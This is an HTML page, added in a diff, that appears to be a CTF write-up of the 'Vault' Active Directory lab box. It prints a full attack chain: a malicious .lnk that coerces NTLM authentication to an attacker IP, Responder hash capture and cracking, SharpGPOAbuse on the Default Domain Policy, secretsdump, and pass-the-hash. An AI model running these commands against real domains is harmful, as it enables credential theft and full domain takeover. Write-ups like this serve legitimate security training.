@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vault &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Vault</h1>
+    <div class="meta">Target: <code>192.168.180.172</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">SMB</span><span class="tag">NTLMTheft</span><span class="tag">Responder</span><span class="tag">NTLMv2</span><span class="tag">GPOAbuse</span><span class="tag">SharpGPOAbuse</span><span class="tag">SecretsDump</span><span class="tag">PassTheHash</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#smb-anonymous-read-write-share">SMB, Anonymous Read-Write Share</a><a class="lvl3" href="#rid-brute-force-user-discovery">RID Brute-Force, User Discovery</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#ntlm-theft-via-malicious-lnk-file-in-documentsshare">NTLM Theft via Malicious .lnk File in DocumentsShare</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#bloodhound-write-access-to-default-domain-policy">BloodHound, Write Access to Default Domain Policy</a><a class="lvl3" href="#sharpgpoabuse-adding-anirudh-to-local-admins">SharpGPOAbuse, Adding anirudh to Local Admins</a><a class="lvl3" href="#impacket-secretsdump-administrator-hash">impacket-secretsdump → Administrator Hash</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Vault is an Active Directory Domain Controller box where an anonymous-writable SMB share becomes the mechanism for NTLM hash theft. Planting a malicious <code>.lnk</code> file in the share and letting Responder capture the NTLMv2 hash from the first user who browses to it gives a domain account. That account has write access to the Default Domain Policy GPO, which SharpGPOAbuse exploits to add it to the local Administrators group, enabling an <code>impacket-secretsdump</code> of all domain hashes and a final pass-the-hash as Administrator.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          Domain: vault.offsec
+445/tcp  open  microsoft-ds
+3268/tcp open  ldap          (GlobalCatalog)
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</code></pre>
+<p>DC hostname: <code>DC.vault.offsec</code>. Domain: <code>vault.offsec</code>. SMB signing required.</p>
+<h3 id="smb-anonymous-read-write-share">SMB, Anonymous Read-Write Share</h3>
+<p>Listing shares without credentials:</p>
+<pre><code class="language-sh">smbclient -L 192.168.180.172
+
+    Sharename       Type  Comment
+    ---------       ----  -------
+    ADMIN$          Disk  Remote Admin
+    C$              Disk  Default share
+    DocumentsShare  Disk
+    IPC$            IPC   Remote IPC
+    NETLOGON        Disk  Logon server share
+    SYSVOL          Disk  Logon server share
+</code></pre>
+<p><code>DocumentsShare</code> had no comment and was empty. Testing write access via a null session succeeded.</p>
+<h3 id="rid-brute-force-user-discovery">RID Brute-Force, User Discovery</h3>
+<p>Without authenticated LDAP access, RID cycling against the DC surfaced one non-default user:</p>
+<pre><code>1103: VAULT\anirudh (SidTypeUser)
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="ntlm-theft-via-malicious-lnk-file-in-documentsshare">NTLM Theft via Malicious .lnk File in DocumentsShare</h3>
+<p>An anonymous-writable share that a domain user regularly browses is a coercion opportunity. When Windows Explorer renders a directory containing a <code>.lnk</code> file that points to a UNC path, it automatically tries to authenticate to that path, sending NTLMv2 credentials to whoever is listening.</p>
+<p><code>ntlm_theft.py</code> generated the malicious shortcut:</p>
+<pre><code class="language-sh">python3 ntlm_theft.py -g lnk -s 192.168.45.244 -f vault
+Created: vault/vault.lnk (BROWSE TO FOLDER)
+</code></pre>
+<p>Responder was started on the attacker's interface:</p>
+<pre><code class="language-sh">sudo responder -I tun0
+</code></pre>
+<p>The <code>.lnk</code> was uploaded to DocumentsShare:</p>
+<pre><code class="language-sh">smbclient -U '' \\\\192.168.180.172\\DocumentsShare
+smb: \&gt; put vault.lnk
+putting file vault.lnk as \vault.lnk (24.3 kb/s)
+</code></pre>
+<p>Shortly after, Responder captured an NTLMv2 challenge-response:</p>
+<pre><code class="language-sh">[SMB] NTLMv2-SSP Username : VAULT\anirudh
+[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:5348ef068dd4113b:560851A1F7D74ADAEE...
+</code></pre>
+<blockquote>
+<p><strong>Why <code>.lnk</code> files trigger automatic authentication:</strong> Windows Shell Link files encode a target path. When Explorer renders a folder view, it resolves every shortcut's target to display the icon, including UNC paths. This causes Windows to attempt authentication to the named server using the current user's credentials before any click occurs. The user just has to open the folder; no interaction with the file itself is needed.</p>
+</blockquote>
+<p>The full NTLMv2 hash was cracked with John:</p>
+<pre><code class="language-sh">john hash --wordlist=/usr/share/wordlists/rockyou.txt
+SecureHM         (anirudh)
+</code></pre>
+<p>Credentials:</p>
+<pre><code>anirudh : ‹redacted›
+</code></pre>
+<p>WinRM access confirmed:</p>
+<pre><code class="language-sh">evil-winrm -u 'anirudh' -p '‹redacted›' -i 192.168.180.172
+</code></pre>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\anirudh\Desktop&gt; type local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="bloodhound-write-access-to-default-domain-policy">BloodHound, Write Access to Default Domain Policy</h3>
+<p>Running BloodHound remotely:</p>
+<pre><code class="language-sh">bloodhound-python -u anirudh -p ‹redacted› -d vault.offsec -c All -ns 192.168.180.172
+</code></pre>
+<p>BloodHound showed <code>anirudh</code> had direct write access ("first degree object control") to the <strong>Default Domain Policy</strong> GPO. This GPO applies to all machines in the domain, including the DC itself.</p>
+<blockquote>
+<p><strong>What GPO write access means for privilege escalation:</strong> Group Policy Objects control machine configuration for every system they apply to. An account that can write a GPO can add entries to <code>GptTmpl.inf</code> under the policy's <code>SecEdit</code> directory, modifying things like local group memberships. SharpGPOAbuse automates this by adding a user to the local Administrators group via the GPO's restricted groups setting. When the GPO next refreshes, the DC applies the change, and the attacker's account is a local admin on every machine the GPO targets.</p>
+</blockquote>
+<h3 id="sharpgpoabuse-adding-anirudh-to-local-admins">SharpGPOAbuse, Adding anirudh to Local Admins</h3>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\anirudh\Documents&gt; upload SharpGPOAbuse.exe
+
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName &quot;Default Domain Policy&quot;
+
+[+] Domain = vault.offsec
+[+] Domain Controller = DC.vault.offsec
+[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
+[+] GUID of &quot;Default Domain Policy&quot; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340...}\Machine\Microsoft\
+    Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+</code></pre>
+<h3 id="impacket-secretsdump-administrator-hash">impacket-secretsdump → Administrator Hash</h3>
+<p>With anirudh now a local administrator after GPO refresh, <code>secretsdump</code> dumped the domain hashes remotely:</p>
+<pre><code class="language-sh">impacket-secretsdump vault.offsec/anirudh:‹redacted›@192.168.180.172
+
+Administrator:500:‹redacted›:‹redacted›:::
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<p>Pass-the-hash with the Administrator NT hash:</p>
+<pre><code class="language-sh">evil-winrm -u 'Administrator' -H '‹redacted›' -i 192.168.180.172
+</code></pre>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Anonymous-writable shares plus Responder equals credential theft with no exploitation.</strong> The user only needs to open the folder containing the <code>.lnk</code> file, Windows does the rest automatically.</li>
+<li><strong>GPO write access on the Default Domain Policy is domain-wide privilege escalation.</strong> Any user with write access to a GPO applied to the DC can add themselves to local Admins on every affected machine. BloodHound surfaces this path under "first degree object control."</li>
+<li><strong>SharpGPOAbuse makes GPO abuse reliable and repeatable.</strong> It handles the policy version number increment and the correct GptTmpl.inf structure that Active Directory validates on refresh.</li>
+<li><strong><code>SeRestorePrivilege</code> on a DC is also a viable escalation path</strong> (notes explored the Utilman.exe swap route), but GPO abuse was cleaner and didn't require RDP interaction.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
